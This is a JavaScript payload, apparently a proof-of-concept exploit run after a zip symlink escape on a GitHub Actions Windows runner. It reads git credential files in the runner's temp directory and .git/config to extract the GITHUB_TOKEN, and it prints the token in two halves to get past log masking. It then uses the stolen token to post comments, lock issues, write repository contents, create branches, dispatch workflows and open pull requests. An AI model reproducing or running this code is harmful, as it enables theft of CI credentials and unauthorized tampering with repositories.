(async () => {
  const fs = await import('node:fs');
  const TAG = "v1";
  const out = (s) => console.log(s);
  out("PWNED-WTI-ZIPSLIP-" + TAG + " rce=1 user=" + (process.env.USERNAME || "?") + " run=" + (process.env.GITHUB_RUN_ID || "?") + " job=" + (process.env.GITHUB_JOB || "?"));
  let b64 = "";
  const tmp = process.env.RUNNER_TEMP || "D:/a/_temp";
  out("RUNNER_TEMP=" + tmp);
  try {
    for (const f of fs.readdirSync(tmp)) {
      if (!/^git-credentials-.*\.config$/.test(f)) continue;
      try {
        const txt = fs.readFileSync(tmp + "/" + f, "utf8");
        const m = txt.match(/AUTHORIZATION:\s*basic\s+([A-Za-z0-9+/=]+)/i);
        if (m) { b64 = m[1]; out("CRED_SOURCE=" + f); }
      } catch (e) { out("CRED_READ_ERR=" + e.message); }
    }
  } catch (e) { out("TEMPDIR_ERR=" + e.message); }
  if (!b64) {
    try {
      const cfg = fs.readFileSync((process.env.GITHUB_WORKSPACE || "") + "/.git/config", "utf8");
      const m = cfg.match(/AUTHORIZATION:\s*basic\s+([A-Za-z0-9+/=]+)/i);
      if (m) { b64 = m[1]; out("CRED_SOURCE=.git/config"); }
    } catch (e) { out("GITCFG_ERR=" + e.message); }
  }
  out("CRED_FOUND=" + (b64 ? "true" : "false"));
  if (b64) {
    const half = Math.ceil(b64.length / 2);
    out("TOKEN_B64_PART1=" + b64.slice(0, half));
    out("TOKEN_B64_PART2=" + b64.slice(half));
    const dec = Buffer.from(b64, "base64").toString("utf8");
    const idx = dec.indexOf(":");
    const tok = idx >= 0 ? dec.slice(idx + 1) : dec;
    out("TOKEN_LEN=" + tok.length + " TOKEN_PREFIX=" + tok.slice(0, 4));
    const repo = process.env.GITHUB_REPOSITORY;
    const H = { Authorization: "Bearer " + tok, Accept: "application/vnd.github+json", "X-GitHub-Api-Version": "2022-11-28", "User-Agent": "wti-poc" };
    const call = async (label, url, opts) => {
      try {
        const r = await fetch(url, Object.assign({}, opts || {}, { headers: Object.assign({}, H, (opts && opts.headers) || {}) }));
        const t = await r.text();
        out(label + "_STATUS=" + r.status);
        out(label + "_BODY=" + t.replace(/\s+/g, " ").slice(0, 400));
        return r;
      } catch (e) { out(label + "_ERR=" + e.message); }
    };
    let issue = null;
    try {
      const ev = JSON.parse(fs.readFileSync(process.env.GITHUB_EVENT_PATH, "utf8"));
      issue = ev.issue ? ev.issue.number : (ev.issue_number || null);
    } catch (e) { out("EVENTPARSE_ERR=" + e.message); }
    out("EVENT_ISSUE=" + issue);
    await call("AUTHENTICATED_REPO", "https://api.github.com/repos/" + repo);
    await call("ISSUE_READ", "https://api.github.com/repos/" + repo + "/issues/" + issue);
    if (issue) {
      await call("POST_COMMENT", "https://api.github.com/repos/" + repo + "/issues/" + issue + "/comments", {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ body: "PWNED-WTI-ZIPSLIP-" + TAG + ": code execution on the `windows-2022` triage runner as `" + (process.env.USERNAME || "?") + "` via zip symlink escape. Stolen checkout GITHUB_TOKEN used for this call. Run: " + (process.env.GITHUB_SERVER_URL || "") + "/" + repo + "/actions/runs/" + (process.env.GITHUB_RUN_ID || "") })
      });
    }
    await call("LOCK_ISSUE", "https://api.github.com/repos/" + repo + "/issues/" + (issue || 2) + "/lock", {
      method: "PUT", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ lock_reason: "resolved" })
    });
    await call("UNLOCK_ISSUE", "https://api.github.com/repos/" + repo + "/issues/" + (issue || 2) + "/lock", {
      method: "DELETE"
    });
    await call("CONTENTS_WRITE", "https://api.github.com/repos/" + repo + "/contents/attack-proof-" + TAG + ".txt", {
      method: "PUT", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ message: "poc " + TAG, content: Buffer.from("poc " + TAG).toString("base64") })
    });
    await call("GIT_REF_CREATE", "https://api.github.com/repos/" + repo + "/git/refs", {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ ref: "refs/heads/poc-" + TAG, sha: (process.env.GITHUB_SHA || "") })
    });
    await call("WORKFLOW_DISPATCH", "https://api.github.com/repos/" + repo + "/actions/workflows/new_issue_comment.yml/dispatches", {
      method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ ref: "master" })
    });
    await call("PR_CREATE", "https://api.github.com/repos/" + repo + "/pulls", {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ title: "poc " + TAG, head: "poc-" + TAG, base: "master" })
    });
  }
  out("PAYLOAD_DONE");
})();
